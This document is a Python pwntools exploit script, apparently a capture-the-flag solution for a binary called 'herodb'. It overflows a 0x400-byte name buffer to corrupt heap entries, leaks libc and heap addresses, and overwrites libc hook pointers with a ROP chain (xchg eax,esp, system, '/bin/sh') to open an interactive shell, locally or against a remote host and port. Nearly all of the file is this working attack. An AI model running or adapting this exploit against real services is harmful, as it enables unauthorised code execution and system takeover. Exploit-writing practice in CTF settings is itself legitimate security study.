#!/usr/bin/env python

from pwn import *
import sys

def add(name):
	r.sendline('2')
	r.sendlineafter(': ', name)
	r.recvuntil('>> ')

def changename(idx, name):
	r.sendline('3')
	for _ in range(idx):
		r.sendlineafter(': ', 'n')
	r.sendlineafter(': ', 'y')
	r.sendlineafter(': ', name)
	r.recvuntil('>> ')

def view(idx):
	r.sendline('3')
	for _ in range(idx):
		r.sendlineafter(': ', 'n')
		r.recvuntil('----')
	r.sendlineafter(': ', 'n')
	data = r.recvuntil('----', drop=True).strip()
	while True:
		token = r.recvuntil('>> ', timeout=.5)
		if token:
			break
		else:
			r.sendline('n')
	return data

context.arch = 'x86'

def exploit(r):
	r.recvuntil('>> ')

	add("AAAAAAAA")
	add("bbbbbbbb")

	payload  = flat(['A'*0x400,
					0, 0x19, 1, 123, 0x804afcc ])
	changename(0, payload)
	libc_base = u32(view(1).split()[1][:4]) - 0x705b0
	log.info("libc_base: " + hex(libc_base))

	libc_free_hook = libc_base + 0x1b18b0

	payload  = flat(['A'*0x400,
					0, 0x19, 1, 123, libc_base+0x1b07b0 ])
	changename(0, payload)

	leak = view(1).split()[1].ljust(4, '\0')
	heap = u32(leak) - 0xc60
	if heap < 0x08000000:
		heap |= 0x09000000
	log.info('heap: ' + hex(heap))

	add('CCCCCCCC')

	payload  = flat(['A'*0x400,
					0, 0x19, 1, 123, libc_base+0x1b07b0, libc_base+0x1b0d4c ])
	changename(0, payload)

	xchg_eax_esp = libc_base + 0x00018e97
	libc_system = libc_base + 0x3a940
	libc_binsh = libc_base + 0x158e8b

	changename(2, flat([libc_system,
						libc_binsh,
						libc_binsh,
						'a'*16,
						xchg_eax_esp]))


	r.sendline('0')


	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./herodb_6b02ed1bae74af9b2bf885a976840c17'], env={"LD_PRELOAD":"./libc.so"})
        print util.proc.pidof(r)
        pause()
        exploit(r)